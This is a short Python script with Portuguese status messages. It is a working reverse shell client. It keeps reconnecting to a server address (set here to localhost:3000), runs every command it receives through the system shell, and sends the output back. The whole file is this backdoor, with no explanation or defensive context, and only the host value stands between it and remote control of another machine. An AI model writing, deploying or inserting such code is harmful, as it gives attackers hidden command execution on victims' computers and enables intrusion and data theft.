from socket import AF_INET, socket, SOCK_STREAM
from threading import Thread 
from subprocess import PIPE, Popen
from time import sleep



HOST = 'localhost'
PORT = 3000

BUFSIZE = 1024
ADDR  = (HOST, PORT)

client_socket =  socket(AF_INET, SOCK_STREAM)


def connect():
    try:
        client_socket.connect(ADDR)
        print('[*] conectado...')
    except Exception as e:
        print(e)
        return
    conexao()


def conexao():
    global client_socket
    while True:
        try:
            comando = client_socket.recv(BUFSIZE).decode('utf8')

            proc = Popen(comando, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
            saida_comando = proc.stdout.read() + proc.stderr.read()
            client_socket.send(saida_comando)
        except Exception as e:
            print(e)
            break

    print('servidor descontectado!')
    client_socket.close()
    client_socket =  socket(AF_INET, SOCK_STREAM)
        

def main():
    while True:
        print('tentando conectar ao servidor!')
        connect()
        sleep(2)


main()